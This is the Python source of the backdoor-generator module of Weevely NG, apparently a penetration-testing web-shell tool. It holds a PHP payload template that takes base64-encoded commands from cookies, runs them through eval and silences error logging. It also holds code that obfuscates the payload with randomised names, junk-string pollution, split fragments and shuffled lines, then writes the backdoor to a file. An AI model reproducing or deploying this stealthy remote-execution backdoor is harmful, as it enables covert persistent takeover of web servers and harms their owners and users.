# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
import base64, codecs
from random import random, randrange, choice, shuffle
from pollution import random_string, pollute_with_static_str

class Backdoor:

#	payload_template= """
#$c='count';
#$a=$_COOKIE;
#if(reset($a)=='%%%START_KEY%%%' && $c($a)>3){
#ini_set('error_log', '/dev/null');
#$k='%%%END_KEY%%%';
#echo '<'.$k.'DEBUG>';
#print(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
#echo '</'.$k.'DEBUG>';
#echo '<'.$k.'>';
#eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
#echo '</'.$k.'>';
#}
#"""

	payload_template= """
$c='count';
$a=$_COOKIE;
if(reset($a)=='%%%START_KEY%%%' && $c($a)>3){
ini_set('error_log', '/dev/null');
$k='%%%END_KEY%%%';
echo '<'.$k.'>';
eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
echo '</'.$k.'>';
}
"""

	backdoor_template = """<?php 
$%%PAY_VAR%%1="%%PAYLOAD1%%";
$%%PAY_VAR%%2="%%PAYLOAD2%%";
$%%PAY_VAR%%3="%%PAYLOAD3%%";
$%%PAY_VAR%%4="%%PAYLOAD4%%";
$%%B64_FUNC%% = "%%B64_ENCODED%%";
$%%REPL_FUNC%% = "str_replace";
$%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", $%%B64_FUNC%%);
eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%PAY_VAR%%2.$%%PAY_VAR%%3.$%%PAY_VAR%%4))); 
?>
"""

	def __init__( self, password ):
		
		if len(password)<4:
			raise Exception('Password \'%s\' too short, choose another one' % password)
		
		self.password  = password
		self.start_key = self.password[:2]
		self.end_key   = self.password[2:]
		self.payload   = self.payload_template.replace( '%%%START_KEY%%%', self.start_key ).replace( '%%%END_KEY%%%', self.end_key ).replace( '\n', '' )
		self.backdoor  = self.encode_template()

	def __str__( self ):
		return self.backdoor

	def encode_template(self):
		
		b64_new_func_name = random_string()
		b64_pollution, b64_polluted = pollute_with_static_str('base64_decode',frequency=0.7)
		
		payload_var = random_string()
		payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
		
		replace_new_func_name = random_string()
		
		
		length  = len(payload_polluted)
		offset = 7
		piece1	= length / 4 + randrange(-offset,+offset)
		piece2  = length / 2 + randrange(-offset,+offset)
		piece3  = length*3/4 + randrange(-offset,+offset)
		
		ts_splitted = self.backdoor_template.splitlines()
		ts_shuffled = ts_splitted[1:-3]
		shuffle(ts_shuffled)
		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[-3:]
		self.backdoor_template = '\n'.join(ts_splitted)
		
		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
		template = template.replace( '%%B64_FUNC%%', b64_new_func_name )
		template = template.replace( '%%PAY_VAR%%', payload_var )
		template = template.replace( '%%PAYLOAD_POLLUTION%%', payload_pollution )
		template = template.replace( '%%B64_POLLUTION%%', b64_pollution )
		template = template.replace( '%%PAYLOAD1%%', payload_polluted[:piece1] )
		template = template.replace( '%%PAYLOAD2%%', payload_polluted[piece1:piece2] )
		template = template.replace( '%%PAYLOAD3%%', payload_polluted[piece2:piece3] )
		template = template.replace( '%%PAYLOAD4%%', payload_polluted[piece3:] )
		
		
		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
		
		
		return template
			
		

	def save( self, filename ):
		out = file( filename, 'wt' )
		out.write( self.backdoor )
		out.close()

		print "+ Backdoor file '%s' created with password '%s'." % ( filename, self.password )
